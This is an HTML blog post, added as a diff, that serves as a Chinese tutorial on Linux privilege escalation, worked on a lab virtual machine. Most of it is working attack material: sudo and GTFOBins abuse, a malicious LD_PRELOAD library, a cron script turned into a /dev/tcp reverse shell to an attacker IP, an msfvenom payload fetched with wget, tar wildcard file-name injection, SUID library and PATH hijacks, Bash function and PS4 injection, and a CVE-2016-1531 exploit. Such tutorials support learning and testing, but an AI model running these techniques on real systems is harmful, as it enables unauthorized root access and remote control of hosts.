@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="n3ym4r">
+    
+    <title>
+        
+            linux提权 |
+        
+        n3ym4r&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#5ed5cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/logo.svg","font_size":null,"font_family":null,"left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Pay attention to safety!","font_color":null,"hitokoto":{"enable":true}},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block_tools":{"enable":true,"style":"mac"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.9"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               n3ym4r&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">linux提权</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">n3ym4r</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-02-25 23:56:14</span>
+        <span class="mobile">2023-02-25 23:56</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-02-25 16:03:34</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%8F%90%E6%9D%83/">提权</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>6k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>29 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  这里通过简单靶场举例说明，了解提权的基础姿势。</p>
+<span id="more"></span>
+
+<h2 id="提权检测脚本"><a href="#提权检测脚本" class="headerlink" title="提权检测脚本"></a>提权检测脚本</h2><p>  在拿到普通用户shell后，可以手动输入命令2来查询系统信息、用户信息、正在运行的服务、第三方软件等等可能用来提权的点。同时，也可以利用现成的收集脚本来进行收集，这里介绍linpeas脚本，链接如下：<a class="link"   target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS%E3%80%82%E9%98%85%E8%AF%BB%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%EF%BC%8C%E6%AD%A4%E8%84%9A%E6%9C%AC%E5%8F%AF%E4%BB%A5%E6%94%B6%E9%9B%86%E5%88%B0%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E3%80%81%E9%A9%B1%E5%8A%A8%E5%99%A8%E3%80%81%E5%B7%B2%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E3%80%81%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E3%80%81%E5%AE%9A%E6%97%B6%E4%BD%9C%E4%B8%9A%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AD%89%E7%AD%89%E4%BF%A1%E6%81%AF%E3%80%82%E8%BF%98%E6%9C%89%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%8E%9F%E7%90%86%E5%A4%A7%E5%90%8C%E5%B0%8F%E5%BC%82%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%81%9A%E4%BB%8B%E7%BB%8D%E4%BA%86%E3%80%82" >https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS。阅读官方文档，此脚本可以收集到系统信息、驱动器、已安装软件、进程信息、定时作业、服务等等信息。还有其他一些脚本，原理大同小异，这里不做介绍了。<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><strong>LinPeas</strong>: <a class="link"   target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" >https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS<i class="fas fa-external-link-alt"></i></a></li>
+<li><strong>LinEnum:</strong> <a class="link"   target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum" >https://github.com/rebootuser/LinEnum<i class="fas fa-external-link-alt"></i></a></li>
+<li><strong>LES (Linux Exploit Suggester):</strong> <a class="link"   target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester" >https://github.com/mzet-/linux-exploit-suggester<i class="fas fa-external-link-alt"></i></a></li>
+<li><strong>Linux Smart Enumeration:</strong> <a class="link"   target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration" >https://github.com/diego-treitos/linux-smart-enumeration<i class="fas fa-external-link-alt"></i></a></li>
+<li><strong>Linux Priv Checker:</strong> <a class="link"   target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker" >https://github.com/linted/linuxprivchecker<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><h3 id="命令提权"><a href="#命令提权" class="headerlink" title="命令提权"></a>命令提权</h3><p>  默认情况下，sudo命令允许用户以root权限执行命令&#x2F;运行程序，某些情况下，系统管理员会允许普通用户提供一些灵活的权限，例如，普通用户需要使用nmap，而又不想让普通用户得到完全的root权限，此时，root用户可以允许普通用户仅以root权限运行这个程序，在其他应用程序维持原来的权限级别。</p>
+<p>  任何用户都可以使用<code>sudo -l</code>命令查看当前与root权限相关的情况。</p>
+<pre><code class="shell">user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+</code></pre>
+<p>  在此例中，有11个命令允许以root权限执行，因此我们可以尝试使用此命令的某些功能来获得特权 shell。可以通过查阅此网站来查询各种命令提权的使用方法<a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/%E3%80%82%E4%BE%8B%E5%A6%82%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8find%E5%91%BD%E4%BB%A4%E6%9D%A5%E8%BF%9B%E8%A1%8Csudo%E6%8F%90%E6%9D%83%E3%80%82" >https://gtfobins.github.io/。例如，这里我们使用find命令来进行sudo提权。<i class="fas fa-external-link-alt"></i></a></p>
+<pre><code class="shell">user@debian:~$ sudo find . -exec /bin/sh \; -quit
+sh-4.1# whoami
+root
+sh-4.1# id
+uid=0(root) gid=0(root) groups=0(root)
+sh-4.1# 
+</code></pre>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>  如果您在 <code>sudo -l</code> 的输出中发现以下句子：env_keep+&#x3D;LD_PRELOAD 并且您可以使用 sudo 调用一些命令，则可以提升权限。如下：</p>
+<pre><code class="shell">user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+</code></pre>
+<p>  LD_PRELOAD 和 LD_LIBRARY_PATH 都继承自用户环境。LD_PRELOAD 在程序运行时先加载一个共享对象。 LD_LIBRARY_PATH 提供首先搜索共享库的目录列表。也就是说，如果攻击者控制 LD_LIBRARY_PATH env 变量，则可能会滥用类似的权限，因为他控制着要搜索库的路径。通过改变环境变量，使得程序运行时执行我们的恶意文件。</p>
+<p>  另存为&#x2F;tmp&#x2F;pe.c</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() &#123;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    setgid(0);
+    setuid(0);
+    system(&quot;/bin/bash&quot;);
+&#125;
+</code></pre>
+<p>  然后编译它使用：</p>
+<pre><code>cd /tmp
+gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+</code></pre>
+<p>  最后运行提权</p>
+<pre><code>sudo LD_PRELOAD=./pe.so &lt;COMMAND&gt; #Use any command you can run with sudo
+</code></pre>
+<p>例如：</p>
+<pre><code class="shell">user@debian:~$ vim /tmp/pe.c
+user@debian:~$ cd /tmp
+user@debian:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+user@debian:/tmp$ sudo LD_PRELOAD=./pe.so apache2
+root@debian:/tmp# 
+</code></pre>
+<p>注意最后一行已经变成了root权限shell</p>
+<h2 id="Cron作业"><a href="#Cron作业" class="headerlink" title="Cron作业"></a>Cron作业</h2><p>  Cron作业用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者而非当前用户的权限运行。</p>
+<h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>  如果有一个以 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行。</p>
+<p>  Cron 表文件 (crontabs) 存储 cron 作业的配置。crontab 位于 &#x2F;etc&#x2F;crontab。查看此文件：</p>
+<pre><code class="shell">user@debian:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+</code></pre>
+<p>  可以看到有两个计划运行的作业，一个为overwrite.sh，另一个为&#x2F;usr&#x2F;local&#x2F;bin&#x2F;compress.sh。</p>
+<p>  找到overwrite.sh文件所在位置，并查看此文件权限</p>
+<pre><code class="shell">user@debian:~$ locate overwrite.sh
+locate: warning: database `/var/cache/locate/locatedb&#39; is more than 8 days old (actual age is 1016.0 days)
+/usr/local/bin/overwrite.sh
+user@debian:~$ ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+</code></pre>
+<p>  可以看到，文件位于&#x2F;usr&#x2F;local&#x2F;bin&#x2F;overwrite.sh，并且全局可写，那么我们就可以将此文件内容更改。</p>
+<p>  将文件内容改为反弹shell的命令</p>
+<pre><code class="shell">!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.18.47.107/4444 0&gt;&amp;1
+</code></pre>
+<p>  本机开启监听，等待cron作业执行</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.18.47.107] from (UNKNOWN) [10.10.80.4] 38638
+bash: no job control in this shell
+root@debian:~# 
+</code></pre>
+<p>  得到root权限</p>
+<h3 id="PATH-环境变量"><a href="#PATH-环境变量" class="headerlink" title="PATH 环境变量"></a>PATH 环境变量</h3><p>在&#x2F;etc&#x2F;crontab文件可以看到，PATH为<code>PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</code>，我们可以在&#x2F;home&#x2F;user目录下新建一个overwrite.sh脚本如下：</p>
+<pre><code>#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+</code></pre>
+<p>  然后，确保此脚本有执行权限：<code>chmod +x /home/user/overwrite.sh</code></p>
+<p>  等待系统执行作业，使用 -p 运行 &#x2F;tmp&#x2F;rootbash 命令以获得以 root 权限运行的 shell</p>
+<pre><code class="shell">user@debian:~$ /tmp/rootbash -p
+rootbash-4.1# whoami
+root
+</code></pre>
+<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>查看另一个作业文件</p>
+<pre><code>sh-4.1$ cat /usr/local/bin/compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+sh-4.1$ 
+</code></pre>
+<p>可以看到脚本命令为切换到&#x2F;home&#x2F;user目录下，然后把目录里的所有文件都压缩，生成一个压缩包，命名为backup.tar.gz。</p>
+<p>通过查阅<a class="link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tar/%EF%BC%8C%E5%BE%97%E5%88%B0%60tar" >https://gtfobins.github.io/gtfobins/tar/，得到`tar<i class="fas fa-external-link-alt"></i></a> -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null –checkpoint&#x3D;1 –checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh&#96;使用此命令可拿到shell。</p>
+<p>那么可以在目录下新建两个文件</p>
+<p>首先在本地使用msf生成shell.elf</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.47.107 LPORT=9999 -f elf -o shell.elf
+
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: shell.elf
+</code></pre>
+<p>然后，在本地开一个server</p>
+<pre><code class="shell">┌──(n3ym4r㉿kali)-[~]shell
+└─$ python3 -m http.server 80      
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+127.0.0.1 - - [25/Feb/2023 19:21:08] &quot;GET / HTTP/1.1&quot; 200 -
+127.0.0.1 - - [25/Feb/2023 19:21:09] code 404, message File not found
+127.0.0.1 - - [25/Feb/2023 19:21:09] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -
+10.10.80.4 - - [25/Feb/2023 19:22:41] &quot;GET /shell.elf HTTP/1.0&quot; 200 -
+</code></pre>
+<p>在主机下载</p>
+<pre><code class="shell">user@debian:~$ wget http://10.18.47.107/shell.elf
+--2023-02-25 06:22:40--  http://10.18.47.107/shell.elf
+Connecting to 10.18.47.107:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 194 [application/octet-stream]
+Saving to: “shell.elf”
+
+100%[============================================================================&gt;] 194         --.-K/s   in 0s      
+
+2023-02-25 06:22:41 (60.0 MB/s) - “shell.elf” saved [194/194]
+</code></pre>
+<p>赋予执行权限</p>
+<pre><code>user@debian:~$ chmod +x /home/user/shell.elf
+</code></pre>
+<p>在home&#x2F;user下，新建两个文件</p>
+<pre><code class="shell">user@debian:~$ touch /home/user/--checkpoint=1
+user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
+</code></pre>
+<p>之后，等待作业执行，得到反弹shell</p>
+<p>这里，简单解释一下，作业会执行tar命令，我们在目录下新建两个文件，将命名改为tar可执行的命令，也就是说会把这两个文件的名称当做命令来执行，而不是作为文件。</p>
+<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><p>suid即set user id，是一种授予文件的权限类型，它允许用户使用者以文件所有者的权限来执行文件。需要这种特殊权限的场景在Linux下很常见。</p>
+<p>使用<code>find / -perm -4000 2&gt;/dev/null</code> 即可获得所有suid可执行文件</p>
+<pre><code>user@debian:~$ find / -perm -4000 2&gt;/dev/null 
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/tmp/rootbash
+/sbin/mount.nfs
+user@debian:~$
+</code></pre>
+<h3 id="已知漏洞"><a href="#已知漏洞" class="headerlink" title="已知漏洞"></a>已知漏洞</h3><p>在上面的查询中可以看到<code>/usr/sbin/exim-4.84-3</code>，在Google，GitHub，exploit-db查询此版本有无漏洞。查询得到存在 CVE-2016-1531漏洞，利用现成exp进行漏洞利用。</p>
+<pre><code class="shell">user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
+[ CVE-2016-1531 local root exploit
+sh-4.1# id
+uid=0(root) gid=1000(user) groups=0(root)
+</code></pre>
+<h3 id="共享对象注入"><a href="#共享对象注入" class="headerlink" title="共享对象注入"></a>共享对象注入</h3><p><code>/usr/local/bin/suid-so</code> SUID 可执行文件容易受到共享对象注入的攻击。</p>
+<pre><code class="shell">user@debian:~$ /usr/local/bin/suid-so              //执行此文件，会出现进度条
+Calculating something, please wait...
+[=====================================================================&gt;] 99 %
+Done.
+user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot; //在文件上运行 strace 并在输出中搜索打开/访问调用和“没有这样的文件”错误
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3
+open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  //最后一行，可执行文件试图在我们的主目录中加载 /home/user/.config/libcalc.so 共享对象，但找不到。
+user@debian:~$ mkdir /home/user/.config                    //为 libcalc.so 文件创建 .config 目录
+user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c   //将/home/user/tools/suid/libcalc.c编译到 suid-so 可执行文件查找它的位置的共享对象中
+user@debian:~$ /usr/local/bin/suid-so           //再次执行 suid-so 可执行文件，注意这次我们得到的不是进度条，而是 root shell
+Calculating something, please wait...
+bash-4.1# id
+uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+bash-4.1# 
+</code></pre>
+<p>libcalc.c:</p>
+<pre><code class="shell">bash-4.1# cat /home/user/tools/suid/libcalc.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void inject() __attribute__((constructor));
+
+void inject() &#123;
+    setuid(0);
+    system(&quot;/bin/bash -p&quot;);
+&#125;
+</code></pre>
+<h3 id="环境变量-1"><a href="#环境变量-1" class="headerlink" title="环境变量"></a>环境变量</h3><p><code>/usr/local/bin/suid-env</code> 可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序。</p>
+<pre><code class="shell">user@debian:~$ /usr/local/bin/suid-env          //执行文件，发现正在尝试启动Apache2服务
+[....] Starting web server: apache2httpd (pid 1625) already running
+. ok 
+user@debian:~$ strings /usr/local/bin/suid-env    //在文件上运行字符串以查找可打印字符的字符串：
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start  //这一行表明正在调用服务可执行文件以启动网络服务器，但是未使用可执行文件的完整路径（/usr/sbin/service）。
+user@debian:~$ gcc -o service /home/user/tools/suid/service.c  //编译准备好的service文件
+user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env //将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量，并运行 suid-envexecutable
+root@debian:~# id                                   //得到root权限
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+</code></pre>
+<p>service.c:</p>
+<pre><code class="shell">root@debian:~# cat /home/user/tools/suid/service.c 
+int main() &#123;
+    setuid(0);
+    system(&quot;/bin/bash -p&quot;);
+&#125;
+</code></pre>
+<h3 id="滥用shell"><a href="#滥用shell" class="headerlink" title="滥用shell"></a>滥用shell</h3><h4 id="bash-lt-4-2-048"><a href="#bash-lt-4-2-048" class="headerlink" title="bash&lt;4.2-048"></a>bash&lt;4.2-048</h4><p>在 Bash 版本 &lt;4.2-048 中，可以使用类似于文件路径的名称定义 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。</p>
+<pre><code class="shell">user@debian:~$ /bin/bash --version                     //获取bash版本
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+user@debian:~$ function /usr/sbin/service &#123; /bin/bash -p; &#125;     
+//创建一个名为“/usr/sbin/service”的 Bash 函数，它执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数
+user@debian:~$ export -f /usr/sbin/service 
+user@debian:~$ /usr/local/bin/suid-env2 //运行得到root shell 
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+root@debian:~# 
+</code></pre>
+<h4 id="bash-lt-4-4"><a href="#bash-lt-4-4" class="headerlink" title="bash&lt;4.4"></a>bash&lt;4.4</h4><p>在调试模式下，Bash 使用环境变量 PS4 来显示调试语句的额外提示。</p>
+<pre><code class="shell">user@debian:~$ env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2
+ //在启用 bash 调试的情况下运行 /usr/local/bin/suid-env2 可执行文件，并将 PS4 变量设置为创建 SUID 版本 /bin/bash 的嵌入式命令
+ 
+/usr/sbin/service apache2 start
+basename /usr/sbin/service
+VERSION=&#39;service ver. 0.91-ubuntu1&#39;
+basename /usr/sbin/service
+USAGE=&#39;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#39;
+SERVICE=
+ACTION=
+SERVICEDIR=/etc/init.d
+OPTIONS=
+&#39;[&#39; 2 -eq 0 &#39;]&#39;
+cd /
+&#39;[&#39; 2 -gt 0 &#39;]&#39;
+case &quot;$&#123;1&#125;&quot; in
+&#39;[&#39; -z &#39;&#39; -a 2 -eq 1 -a apache2 = --status-all &#39;]&#39;
+&#39;[&#39; 2 -eq 2 -a start = --full-restart &#39;]&#39;
+&#39;[&#39; -z &#39;&#39; &#39;]&#39;
+SERVICE=apache2
+shift
+&#39;[&#39; 1 -gt 0 &#39;]&#39;
+case &quot;$&#123;1&#125;&quot; in
+&#39;[&#39; -z apache2 -a 1 -eq 1 -a start = --status-all &#39;]&#39;
+&#39;[&#39; 1 -eq 2 -a &#39;&#39; = --full-restart &#39;]&#39;
+&#39;[&#39; -z apache2 &#39;]&#39;
+&#39;[&#39; -z &#39;&#39; &#39;]&#39;
+ACTION=start
+shift
+&#39;[&#39; 0 -gt 0 &#39;]&#39;
+&#39;[&#39; -r /etc/init/apache2.conf &#39;]&#39;
+&#39;[&#39; -x /etc/init.d/apache2 &#39;]&#39;
+exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
+Starting web server: apache2httpd (pid 1625) already running
+.
+user@debian:~$ 
+user@debian:~$ /tmp/rootbash -p      //使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell
+
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+</code></pre>
